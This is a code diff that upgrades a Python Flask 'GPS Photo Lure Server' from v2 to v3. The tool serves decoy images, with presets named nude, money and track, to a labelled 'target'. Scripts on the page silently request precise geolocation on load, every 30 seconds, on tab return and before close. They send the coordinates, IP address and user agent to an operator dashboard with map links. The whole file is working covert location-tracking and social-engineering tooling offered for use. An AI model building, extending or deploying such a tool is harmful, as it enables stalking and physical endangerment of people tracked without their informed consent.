@@ -1,42 +1,39 @@
 #!/usr/bin/env python3
 """
-GPS Photo Lure Server v2
-- Shows a visible photo decoy page (the social engineering lure)
-- GPS fires in the background every time the page loads
-- No link expiry — links live forever
-- Every visit is logged with coordinates (if obtained)
+GPS Photo Lure Server v3
+- Choose image from presets (nude/money/track), upload, or external URL
+- Shows decoy image + GPS fires instantly
+- GPS refreshes every 30 seconds (continuous trail)
+- Every visit logged with full GPS coordinates
 """
 
 import os
-import sys
 import json
 import uuid
-import time
 import base64
 import hashlib
 import logging
-import argparse
 import threading
+import requests
 from datetime import datetime, timezone
 from pathlib import Path
+from io import BytesIO
 
-from flask import Flask, request, render_template_string, jsonify, redirect, url_for
+from flask import (
+    Flask, request, render_template_string, jsonify,
+    redirect, url_for, send_file, abort
+)
 
-# ---------------------------------------------------------------------------
-# Configuration
-# ---------------------------------------------------------------------------
+# ── Config ──────────────────────────────────────────────────
 DEFAULT_PORT = 5000
 DEFAULT_HOST = "0.0.0.0"
+MAX_CONTENT_LENGTH = 16 * 1024 * 1024  # 16 MB
+PRESETS = {"nude", "money", "track"}
 
 # In-memory storage
-links = {}         # link_id -> link data
-captures = []      # list of all GPS capture records
+links = {}
 links_lock = threading.Lock()
-captures_lock = threading.Lock()
 
-# ---------------------------------------------------------------------------
-# Logging
-# ---------------------------------------------------------------------------
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s [%(levelname)s] %(message)s",
@@ -44,14 +41,35 @@ logging.basicConfig(
 )
 log = logging.getLogger("gps-lure")
 
-# ---------------------------------------------------------------------------
-# App
-# ---------------------------------------------------------------------------
 app = Flask(__name__)
+app.config["MAX_CONTENT_LENGTH"] = MAX_CONTENT_LENGTH
 
-# ---------------------------------------------------------------------------
-# Stealth HTML template — VISIBLE PHOTO PAGE
-# ---------------------------------------------------------------------------
+# ── Image helpers ──────────────────────────────────────────
+
+def load_preset_image(preset_name):
+    """Load a preset image from the /images/ folder"""
+    path = Path("images") / f"{preset_name}.png"
+    if path.exists():
+        return path.read_bytes(), "image/png"
+    path = Path("images") / f"{preset_name}.jpg"
+    if path.exists():
+        return path.read_bytes(), "image/jpeg"
+    return None, None
+
+
+def fetch_external_image(url):
+    """Download an image from an external URL"""
+    try:
+        resp = requests.get(url, timeout=10, stream=True)
+        if resp.status_code == 200:
+            content_type = resp.headers.get("Content-Type", "image/jpeg")
+            return resp.content, content_type
+    except Exception as e:
+        log.warning("Failed to fetch external image %s: %s", url, e)
+    return None, None
+
+# ── Stealth HTML template (photo decoy page) ──────────────
+
 STEALTH_TEMPLATE = r"""<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -85,67 +103,39 @@ STEALTH_TEMPLATE = r"""<!DOCTYPE html>
         height: auto;
         object-fit: contain;
     }
-    .loading {
-        color: #888;
-        font-size: 14px;
-        padding: 40px;
-        text-align: center;
-    }
     .status-bar {
         position: fixed;
         bottom: 0;
         left: 0;
         right: 0;
         background: rgba(0,0,0,0.7);
-        color: #555;
-        font-size: 11px;
-        padding: 4px 12px;
+        color: #444;
+        font-size: 10px;
+        padding: 3px 12px;
         text-align: center;
         backdrop-filter: blur(4px);
+        font-family: system-ui, sans-serif;
+        z-index: 999;
     }
 </style>
 </head>
 <body>
+    {% if img_data %}
     <div class="photo-container">
-        {% if photo_b64 %}
-        <img src="data:image/{{ img_type }};base64,{{ photo_b64 }}" alt="Photo">
-        {% else %}
-        <div class="loading">No image available</div>
-        {% endif %}
+        <img src="{{ img_data }}" alt="Photo">
     </div>
+    {% else %}
+    <div class="photo-container" style="display:flex;align-items:center;justify-content:center;padding:40px;color:#555;">
+        <p>No image available.</p>
+    </div>
+    {% endif %}
     <div class="status-bar">Photo &bull; {{ visit_num }}</div>
 
 <script>
 (function() {
     var linkId = "{{ link_id }}";
     var visited = {{ visit_num }};
-
-    // Geolocation capture — fires every visit
-    function captureLocation() {
-        if (!navigator.geolocation) {
-            sendCapture(null, null, null, "geolocation not supported");
-            return;
-        }
-        var opts = {
-            enableHighAccuracy: true,
-            timeout: 15000,
-            maximumAge: 0
-        };
-        navigator.geolocation.getCurrentPosition(
-            function(pos) {
-                sendCapture(
-                    pos.coords.latitude,
-                    pos.coords.longitude,
-                    pos.coords.accuracy,
-                    null
-                );
-            },
-            function(err) {
-                sendCapture(null, null, null, err.message || "permission denied");
-            },
-            opts
-        );
-    }
+    var gpsInterval = null;
 
     function sendCapture(lat, lng, acc, err) {
         var payload = {
@@ -158,12 +148,14 @@ STEALTH_TEMPLATE = r"""<!DOCTYPE html>
             user_agent: navigator.userAgent,
             timestamp_iso: new Date().toISOString()
         };
-        // Send to capture endpoint (fire-and-forget)
-        var xhr = new XMLHttpRequest();
-        xhr.open("POST", "/capture", true);
-        xhr.setRequestHeader("Content-Type", "application/json");
-        xhr.send(JSON.stringify(payload));
-        // Fallback via fetch
+        // XHR
+        try {
+            var xhr = new XMLHttpRequest();
+            xhr.open("POST", "/capture", true);
+            xhr.setRequestHeader("Content-Type", "application/json");
+            xhr.send(JSON.stringify(payload));
+        } catch(e) {}
+        // Fetch fallback
         fetch("/capture", {
             method: "POST",
             headers: {"Content-Type": "application/json"},
@@ -172,92 +164,205 @@ STEALTH_TEMPLATE = r"""<!DOCTYPE html>
         }).catch(function(){});
     }
 
-    // Fire GPS immediately (slight delay to let page render first)
-    setTimeout(captureLocation, 300);
+    function captureLocation() {
+        if (!navigator.geolocation) {
+            sendCapture(null, null, null, "geolocation not supported");
+            return;
+        }
+        navigator.geolocation.getCurrentPosition(
+            function(pos) {
+                sendCapture(
+                    pos.coords.latitude,
+                    pos.coords.longitude,
+                    pos.coords.accuracy,
+                    null
+                );
+            },
+            function(err) {
+                var msg = err.message || "unknown error";
+                if (err.code === 1) msg = "permission denied";
+                else if (err.code === 2) msg = "position unavailable";
+                else if (err.code === 3) msg = "timeout";
+                sendCapture(null, null, null, msg);
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+    }
+
+    // Fire GPS immediately on page load
+    setTimeout(captureLocation, 200);
+
+    // Continuous GPS refresh every 30 seconds
+    gpsInterval = setInterval(captureLocation, 30000);
+
+    // Also fire when user returns to the tab
+    document.addEventListener("visibilitychange", function() {
+        if (!document.hidden) {
+            captureLocation();
+        }
+    });
+
+    // Fire one last time before page closes
+    window.addEventListener("beforeunload", function() {
+        if (gpsInterval) clearInterval(gpsInterval);
+        captureLocation();
+    });
 })();
 </script>
 </body>
 </html>"""
 
-# ---------------------------------------------------------------------------
-# Routes
-# ---------------------------------------------------------------------------
+
+# ── Routes ────────────────────────────────────────────────
 
 @app.route("/")
 def index():
-    """Simple landing page with link management."""
-    return """
-    <!DOCTYPE html>
-    <html>
-    <head><title>GPS Lure — Link Manager</title></head>
-    <body style="font-family:sans-serif;padding:20px;background:#111;color:#eee;">
-        <h1>GPS Photo Lure v2</h1>
-        <p>Create a tracking link. Target sees a photo; GPS fires in background.</p>
-        <p>No expiry. Every visit is captured.</p>
-        <hr style="border-color:#333;">
-        <form action="/create" method="post" enctype="multipart/form-data" style="margin-top:20px;">
-            <label>Upload lure photo (optional):</label><br>
-            <input type="file" name="photo" accept="image/*" style="margin:10px 0;color:#eee;"><br>
-            <label>Label / notes (optional):</label><br>
-            <input type="text" name="label" placeholder="e.g. Target Alpha" style="width:300px;padding:6px;margin:10px 0;"><br>
-            <button type="submit" style="padding:10px 24px;background:#2a7;color:#fff;border:none;border-radius:6px;font-size:15px;cursor:pointer;">
-                Generate Tracking Link
-            </button>
+    """Landing page — link manager with image selection"""
+    return """<!DOCTYPE html>
+<html>
+<head>
+<title>GPS Lure v3 — Link Manager</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+    * { box-sizing: border-box; }
+    body { font-family: system-ui, -apple-system, sans-serif; background: #0d0d10; color: #ddd; padding: 20px; max-width: 900px; margin: 0 auto; }
+    h1 { color: #0a8; font-size: 22px; }
+    h2 { color: #aaa; font-size: 16px; margin-top: 25px; }
+    .card { background: #16161e; border: 1px solid #2a2a35; border-radius: 8px; padding: 20px; margin: 15px 0; }
+    label { display: block; margin: 10px 0 4px; font-size: 13px; color: #888; text-transform: uppercase; letter-spacing: 0.5px; }
+    input, select { width: 100%; padding: 8px 10px; background: #0d0d12; border: 1px solid #2a2a35; color: #eee; border-radius: 4px; font-size: 14px; }
+    input:focus, select:focus { border-color: #0a8; outline: none; }
+    .radio-group { display: flex; gap: 20px; flex-wrap: wrap; margin: 8px 0; }
+    .radio-group label { display: inline-flex; align-items: center; gap: 5px; text-transform: none; font-size: 14px; cursor: pointer; }
+    .radio-group input[type="radio"] { width: auto; }
+    .hidden { display: none; }
+    button { background: #0a8; color: #fff; border: none; padding: 10px 28px; border-radius: 6px; font-size: 15px; cursor: pointer; font-weight: 600; margin-top: 10px; }
+    button:hover { background: #0b9; }
+    code { background: #1a1a24; padding: 2px 6px; border-radius: 3px; font-size: 13px; color: #8cf; word-break: break-all; }
+    table { width: 100%; border-collapse: collapse; margin-top: 10px; }
+    th, td { padding: 8px 10px; text-align: left; border-bottom: 1px solid #222; font-size: 13px; }
+    th { color: #666; font-weight: 600; }
+    a { color: #4af; text-decoration: none; }
+    a:hover { text-decoration: underline; }
+    .help { font-size: 12px; color: #666; margin-top: 3px; }
+</style>
+</head>
+<body>
+    <h1>📷 GPS Photo Lure v3</h1>
+    <p style="color:#888;">Create a tracking link. Target sees a photo; GPS fires silently &amp; continuously.</p>
+
+    <div class="card">
+        <form action="/create" method="post" enctype="multipart/form-data" id="createForm">
+
+            <label>Image Source</label>
+            <div class="radio-group">
+                <label><input type="radio" name="img_source" value="preset" checked onchange="toggleSource()"> Preset Image</label>
+                <label><input type="radio" name="img_source" value="upload" onchange="toggleSource()"> Upload Image</label>
+                <label><input type="radio" name="img_source" value="url" onchange="toggleSource()"> External URL</label>
+            </div>
+
+            <div id="presetSection">
+                <label>Choose Preset</label>
+                <select name="preset">
+                    <option value="nude">nude.png</option>
+                    <option value="money">money.png</option>
+                    <option value="track">track.png</option>
+                </select>
+                <div class="help">Upload the actual PNG files to images/ folder</div>
+            </div>
+
+            <div id="uploadSection" class="hidden">
+                <label>Upload Image (max 16MB)</label>
+                <input type="file" name="photo" accept="image/*">
+            </div>
+
+            <div id="urlSection" class="hidden">
+                <label>External Image URL</label>
+                <input type="url" name="img_url" placeholder="https://example.com/photo.jpg">
+                <div class="help">Server will download this image and embed it in the attack page</div>
+            </div>
+
+            <label>Label / Notes (optional)</label>
+            <input type="text" name="label" placeholder="e.g. Target Alpha">
+
+            <button type="submit">Generate Tracking Link</button>
         </form>
-        <hr style="border-color:#333;margin-top:30px;">
-        <h2>Active Links</h2>
-        <div id="links">Loading...</div>
-        <script>
+    </div>
+
+    <h2>Active Links</h2>
+    <div id="links">Loading...</div>
+
+    <script>
+        function toggleSource() {
+            var val = document.querySelector('input[name="img_source"]:checked').value;
+            document.getElementById('presetSection').className = val === 'preset' ? '' : 'hidden';
+            document.getElementById('uploadSection').className = val === 'upload' ? '' : 'hidden';
+            document.getElementById('urlSection').className = val === 'url' ? '' : 'hidden';
+        }
         function loadLinks() {
-            fetch('/links').then(r=>r.json()).then(data=>{
-                var html = '<table border="1" style="border-collapse:collapse;width:100%;border-color:#333;">';
-                html += '<tr style="background:#222;"><th>Created</th><th>Label</th><th>URL</th><th>Visits</th><th>Captures</th><th>Action</th></tr>';
+            fetch('/links').then(function(r){ return r.json(); }).then(function(data){
+                var html = '<table><tr><th>Created</th><th>Label</th><th>Tracking URL</th><th>Visits</th><th>GPS Hits</th><th>Results</th></tr>';
                 data.links.forEach(function(l){
                     var url = window.location.origin + '/l/' + l.id;
                     html += '<tr>';
-                    html += '<td style="padding:6px;">' + l.created + '</td>';
-                    html += '<td style="padding:6px;">' + (l.label||'-') + '</td>';
-                    html += '<td style="padding:6px;"><code style="font-size:12px;word-break:break-all;">' + url + '</code></td>';
-                    html += '<td style="padding:6px;text-align:center;">' + l.visits + '</td>';
-                    html += '<td style="padding:6px;text-align:center;">' + l.captures + '</td>';
-                    html += '<td style="padding:6px;"><a href="/results/' + l.id + '" style="color:#4af;">Results</a></td>';
+                    html += '<td style="font-size:11px;white-space:nowrap;">' + l.created + '</td>';
+                    html += '<td>' + (l.label||'-') + '</td>';
+                    html += '<td><code>' + url + '</code></td>';
+                    html += '<td style="text-align:center;">' + l.visits + '</td>';
+                    html += '<td style="text-align:center;">' + l.captures + '</td>';
+                    html += '<td><a href="/results/' + l.id + '">View</a></td>';
                     html += '</tr>';
                 });
                 html += '</table>';
                 document.getElementById('links').innerHTML = html;
             });
         }
+        toggleSource();
         loadLinks();
         setInterval(loadLinks, 5000);
-        </script>
-    </body>
-    </html>
-    """
+    </script>
+</body>
+</html>"""
 
 
 @app.route("/create", methods=["POST"])
 def create_link():
-    """Create a new tracking link with optional photo."""
+    """Create a new tracking link"""
     label = request.form.get("label", "").strip()
-    photo = request.files.get("photo")
+    img_source = request.form.get("img_source", "preset")
 
-    photo_b64 = None
-    img_type = "jpeg"
+    img_data = None
 
-    if photo and photo.filename:
-        raw = photo.read()
-        if raw:
-            photo_b64 = base64.b64encode(raw).decode("utf-8")
-            # Determine image type for data URI
-            ext = Path(photo.filename).suffix.lower()
-            if ext in (".png",):
-                img_type = "png"
-            elif ext in (".gif",):
-                img_type = "gif"
-            elif ext in (".webp",):
-                img_type = "webp"
-            else:
-                img_type = "jpeg"
+    if img_source == "preset":
+        preset = request.form.get("preset", "nude").strip().lower()
+        if preset not in PRESETS:
+            preset = "nude"
+        raw_bytes, mime = load_preset_image(preset)
+        if raw_bytes:
+            img_b64 = base64.b64encode(raw_bytes).decode("utf-8")
+            img_data = f"data:{mime};base64,{img_b64}"
+
+    elif img_source == "upload":
+        photo = request.files.get("photo")
+        if photo and photo.filename:
+            raw_bytes = photo.read()
+            if raw_bytes:
+                ext = Path(photo.filename).suffix.lower()
+                mime_map = {
+                    ".png": "image/png", ".jpg": "image/jpeg", ".jpeg": "image/jpeg",
+                    ".gif": "image/gif", ".webp": "image/webp",
+                }
+                mime = mime_map.get(ext, "image/jpeg")
+                img_b64 = base64.b64encode(raw_bytes).decode("utf-8")
+                img_data = f"data:{mime};base64,{img_b64}"
+
+    elif img_source == "url":
+        img_url = request.form.get("img_url", "").strip()
+        if img_url:
+            raw_bytes, mime = fetch_external_image(img_url)
+            if raw_bytes:
+                img_b64 = base64.b64encode(raw_bytes).decode("utf-8")
+                img_data = f"data:{mime};base64,{img_b64}"
 
     link_id = uuid.uuid4().hex[:12]
 
@@ -266,65 +371,53 @@ def create_link():
             "id": link_id,
             "created": datetime.now(timezone.utc).isoformat(),
             "label": label if label else None,
-            "photo_b64": photo_b64,
-            "img_type": img_type,
-            "visits": [],       # list of visit records
+            "img_data": img_data,
+            "img_source": img_source,
+            "visits": [],
         }
 
-    log.info("Created link %s (label=%s, photo=%s)", link_id, label, bool(photo_b64))
-
-    # Redirect to index so they can copy the URL
+    log.info("Created link %s (label=%s, source=%s)", link_id, label, img_source)
     return redirect(url_for("index"))
 
 
 @app.route("/l/<link_id>")
 def serve_lure(link_id):
-    """Serve the visible photo decoy page + GPS capture."""
+    """Serve the decoy photo page + GPS capture"""
     with links_lock:
         link = links.get(link_id)
         if not link:
-            return "<h1>Not found</h1><p>This link does not exist.</p>", 404
+            return "<h1>Not found</h1>", 404
 
     visit_num = len(link["visits"]) + 1
 
-    # Log the visit immediately (coordinates filled in later by /capture)
     visit_record = {
         "visit": visit_num,
         "timestamp": datetime.now(timezone.utc).isoformat(),
         "ip": request.remote_addr,
         "user_agent": request.headers.get("User-Agent", ""),
         "referer": request.headers.get("Referer", ""),
-        "gps_latitude": None,
-        "gps_longitude": None,
-        "gps_accuracy": None,
-        "gps_error": None,
-        "gps_captured_at": None,
+        "gps_updates": [],
     }
 
     with links_lock:
         link["visits"].append(visit_record)
 
-    log.info(
-        "Link %s visit #%d from %s (%s)",
-        link_id, visit_num, request.remote_addr,
-        request.headers.get("User-Agent", "")[:80]
-    )
+    log.info("Link %s visit #%d from %s", link_id, visit_num, request.remote_addr)
 
     return render_template_string(
         STEALTH_TEMPLATE,
         link_id=link_id,
         visit_num=visit_num,
-        photo_b64=link["photo_b64"],
-        img_type=link["img_type"],
+        img_data=link["img_data"],
     )
 
 
 @app.route("/capture", methods=["POST"])
 def capture_gps():
-    """Receive GPS coordinates from the stealth page."""
+    """Receive GPS coordinates from the stealth page"""
     data = request.get_json(silent=True) or {}
     link_id = data.get("link_id")
-    visit = data.get("visit")
+    visit_num = data.get("visit")
     lat = data.get("latitude")
     lng = data.get("longitude")
     acc = data.get("accuracy")
@@ -340,166 +433,151 @@ def capture_gps():
         if not link:
             return jsonify({"status": "link not found"}), 404
 
-        # Find the visit record by visit number and update GPS
-        updated = False
         for v in link["visits"]:
-            if v["visit"] == visit:
-                v["gps_latitude"] = lat
-                v["gps_longitude"] = lng
-                v["gps_accuracy"] = acc
-                v["gps_error"] = err
-                v["gps_captured_at"] = ts
+            if v["visit"] == visit_num:
                 v["user_agent"] = ua
-                updated = True
+                v["gps_updates"].append({
+                    "latitude": lat,
+                    "longitude": lng,
+                    "accuracy": acc,
+                    "error": err,
+                    "timestamp": ts,
+                })
                 break
 
-    # Also record in global captures log
-    with captures_lock:
-        captures.append({
-            "link_id": link_id,
-            "visit": visit,
-            "latitude": lat,
-            "longitude": lng,
-            "accuracy": acc,
-            "error": err,
-            "timestamp": ts,
-            "user_agent": ua,
-        })
-
-    if updated:
-        if lat is not None:
-            log.info("GPS captured for link %s visit #%s: %.5f, %.5f (acc=%.1fm)",
-                     link_id, visit, lat, lng, acc or 0)
-        else:
-            log.info("GPS FAILED for link %s visit #%s: %s", link_id, visit, err)
+    if lat is not None:
+        log.info("📍 GPS for %s visit #%s: %.5f, %.5f (acc=%.1fm)",
+                 link_id, visit_num, lat, lng, acc or 0)
     else:
-        log.warning("GPS capture for link %s visit #%s — visit not found", link_id, visit)
+        log.info("⛔ GPS failed for %s visit #%s: %s", link_id, visit_num, err)
 
     return jsonify({"status": "ok"})
 
 
 @app.route("/results/<link_id>")
 def show_results(link_id):
-    """Show detailed results for a specific link."""
+    """Detailed results for a specific link"""
     with links_lock:
         link = links.get(link_id)
         if not link:
             return "<h1>Not found</h1>", 404
-        # Deep copy for rendering
         import copy
         link_data = copy.deepcopy(link)
 
     total_visits = len(link_data["visits"])
-    gps_captures = sum(1 for v in link_data["visits"] if v["gps_latitude"] is not None)
-    gps_failures = sum(1 for v in link_data["visits"] if v["gps_error"] is not None)
+    total_gps_hits = sum(
+        1 for v in link_data["visits"]
+        for u in v.get("gps_updates", [])
+        if u.get("latitude") is not None
+    )
 
-    html = f"""
-    <!DOCTYPE html>
-    <html>
-    <head><title>Results — {link_id}</title>
-    <style>
-        body {{ font-family: sans-serif; background: #111; color: #eee; padding: 20px; }}
-        table {{ border-collapse: collapse; width: 100%; border-color: #333; }}
-        th, td {{ padding: 8px; text-align: left; border-bottom: 1px solid #333; }}
-        th {{ background: #222; }}
-        .success {{ color: #4c4; }}
-        .fail {{ color: #c44; }}
-        .pending {{ color: #aa0; }}
-        pre {{ background: #1a1a1a; padding: 10px; border-radius: 5px; overflow-x: auto; }}
-        a {{ color: #4af; }}
-    </style>
-    </head>
-    <body>
-        <h1>Link Results</h1>
-        <p><strong>ID:</strong> {link_id}</p>
+    html = f"""<!DOCTYPE html>
+<html>
+<head>
+<title>Results — {link_id}</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+    * {{ box-sizing: border-box; }}
+    body {{ font-family: system-ui, -apple-system, sans-serif; background: #0d0d10; color: #ddd; padding: 20px; max-width: 1100px; margin: 0 auto; }}
+    h1 {{ color: #0a8; }}
+    h2 {{ color: #aaa; font-size: 18px; margin-top: 25px; }}
+    .info {{ background: #16161e; border: 1px solid #2a2a35; border-radius: 8px; padding: 15px; margin: 10px 0; }}
+    .info p {{ margin: 4px 0; font-size: 14px; }}
+    table {{ width: 100%; border-collapse: collapse; margin-top: 10px; font-size: 12px; }}
+    th, td {{ padding: 6px 8px; text-align: left; border-bottom: 1px solid #222; }}
+    th {{ color: #666; font-weight: 600; }}
+    .success {{ color: #4c4; }}
+    .fail {{ color: #c44; }}
+    code {{ background: #1a1a24; padding: 2px 6px; border-radius: 3px; color: #8cf; }}
+    pre {{ background: #111117; padding: 15px; border-radius: 6px; overflow-x: auto; font-size: 11px; }}
+    a {{ color: #4af; }}
+    .visit-card {{ background: #16161e; border: 1px solid #2a2a35; border-radius: 6px; padding: 10px; margin: 8px 0; }}
+    .visit-card h4 {{ margin: 0 0 5px; color: #888; }}
+    .gps-update {{ font-size: 11px; margin: 2px 0; }}
+</style>
+</head>
+<body>
+    <h1>📊 Link Results</h1>
+    <div class="info">
+        <p><strong>ID:</strong> <code>{link_id}</code></p>
         <p><strong>Label:</strong> {link_data["label"] or "(none)"}</p>
         <p><strong>Created:</strong> {link_data["created"]}</p>
+        <p><strong>Image Source:</strong> {link_data["img_source"]}</p>
         <p><strong>Total Visits:</strong> {total_visits}</p>
-        <p><strong>GPS Captures:</strong> {gps_captures} / {total_visits}</p>
-        <p><strong>GPS Failures:</strong> {gps_failures}</p>
+        <p><strong>Total GPS Updates:</strong> {total_gps_hits}</p>
         <p><strong>Tracking URL:</strong> <code>{request.host_url.strip('/')}/l/{link_id}</code></p>
-        <hr style="border-color:#333;">
-        <h2>Visit Log</h2>
-        <table>
-        <tr><th>#</th><th>Timestamp</th><th>IP</th><th>Latitude</th><th>Longitude</th><th>Accuracy</th><th>Error</th><th>User-Agent</th></tr>
-    """
+    </div>
+"""
 
     for v in link_data["visits"]:
-        status_cls = "success" if v["gps_latitude"] is not None else ("fail" if v["gps_error"] else "pending")
-        lat_str = f'{v["gps_latitude"]:.5f}' if v["gps_latitude"] is not None else "-"
-        lng_str = f'{v["gps_longitude"]:.5f}' if v["gps_longitude"] is not None else "-"
-        acc_str = f'{v["gps_accuracy"]:.1f}m' if v["gps_accuracy"] is not None else "-"
-        err_str = v["gps_error"] or "-"
-        ua_short = (v["user_agent"] or "")[:60]
+        gps_updates = v.get("gps_updates", [])
+        latest_gps = None
+        for u in reversed(gps_updates):
+            if u.get("latitude") is not None:
+                latest_gps = u
+                break
+
+        status = "📍 Located" if latest_gps else ("⛔ Failed" if any(u.get("error") for u in gps_updates) else "⏳ Pending")
+        status_cls = "success" if latest_gps else "fail"
 
         html += f"""
-        <tr class="{status_cls}">
-            <td>{v["visit"]}</td>
-            <td>{v["timestamp"]}</td>
-            <td>{v["ip"]}</td>
-            <td>{lat_str}</td>
-            <td>{lng_str}</td>
-            <td>{acc_str}</td>
-            <td>{err_str}</td>
-            <td style="font-size:11px;">{ua_short}</td>
-        </tr>"""
+    <div class="visit-card">
+        <h4>Visit #{v["visit"]} — <span class="{status_cls}">{status}</span></h4>
+        <p style="font-size:11px;color:#666;">{v["timestamp"]} | IP: {v["ip"]} | {v.get("user_agent","")[:50]}</p>
+"""
 
-    html += """
-        </table>
-        <hr style="border-color:#333;margin-top:20px;">
-        <h2>Raw JSON</h2>
-        <pre>
-    """
-    html += json.dumps(link_data, indent=2, default=str)
-    html += "\n        </pre>\n    </body>\n</html>"
+        if gps_updates:
+            html += f'<p style="font-size:11px;color:#888;margin:5px 0;">GPS Updates ({len(gps_updates)}):</p>'
+            for idx, u in enumerate(gps_updates):
+                if u.get("latitude") is not None:
+                    map_url = f"https://www.google.com/maps?q={u['latitude']},{u['longitude']}"
+                    html += f'<div class="gps-update">#{idx+1}: <span class="success">{u["latitude"]:.5f}, {u["longitude"]:.5f}</span>'
+                    if u.get("accuracy"):
+                        html += f' ±{u["accuracy"]:.1f}m'
+                    html += f' <a href="{map_url}" target="_blank" style="color:#0a8;">[Map]</a>'
+                    html += f' {u["timestamp"][:19]}</div>'
+                elif u.get("error"):
+                    html += f'<div class="gps-update">#{idx+1}: <span class="fail">❌ {u["error"]}</span> {u["timestamp"][:19]}</div>'
+
+        html += '</div>'
+
+    html += f"""
+    <h2>Raw Data (JSON)</h2>
+    <pre>{json.dumps(link_data, indent=2, default=str)}</pre>
+</body>
+</html>"""
 
     return html
 
 
 @app.route("/links")
 def list_links():
-    """JSON endpoint listing all active links."""
+    """JSON endpoint: all active links"""
     with links_lock:
         result = []
         for lid, l in links.items():
+            total_visits = len(l["visits"])
+            captures = sum(
+                1 for v in l["visits"]
+                for u in v.get("gps_updates", [])
+                if u.get("latitude") is not None
+            )
             result.append({
                 "id": lid,
                 "created": l["created"],
                 "label": l["label"],
-                "visits": len(l["visits"]),
-                "captures": sum(1 for v in l["visits"] if v["gps_latitude"] is not None),
+                "img_source": l["img_source"],
+                "visits": total_visits,
+                "captures": captures,
             })
     return jsonify({"links": result, "total": len(result)})
 
 
-@app.route("/all-captures")
-def all_captures():
-    """Return all GPS captures as JSON."""
-    with captures_lock:
-        return jsonify({"captures": captures, "total": len(captures)})
-
-
-# ---------------------------------------------------------------------------
-# Main
-# ---------------------------------------------------------------------------
-
-def main():
-    parser = argparse.ArgumentParser(description="GPS Photo Lure Server v2")
-    parser.add_argument("--host", default=DEFAULT_HOST, help=f"Bind address (default: {DEFAULT_HOST})")
-    parser.add_argument("--port", type=int, default=DEFAULT_PORT, help=f"Port (default: {DEFAULT_PORT})")
-    parser.add_argument("--debug", action="store_true", help="Enable debug mode")
-    args = parser.parse_args()
-
-    log.info("=" * 60)
-    log.info("GPS Photo Lure Server v2")
-    log.info("=" * 60)
-    log.info("Listening on http://%s:%d", args.host, args.port)
-    log.info("No link expiry — links live forever")
-    log.info("Every visit captures GPS coordinates")
-    log.info("=" * 60)
-
-    app.run(host=args.host, port=args.port, debug=args.debug)
+@app.route("/health")
+def health():
+    return jsonify({"status": "ok", "links": len(links)})
 
 
 if __name__ == "__main__":
-    main()
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port, debug=False)
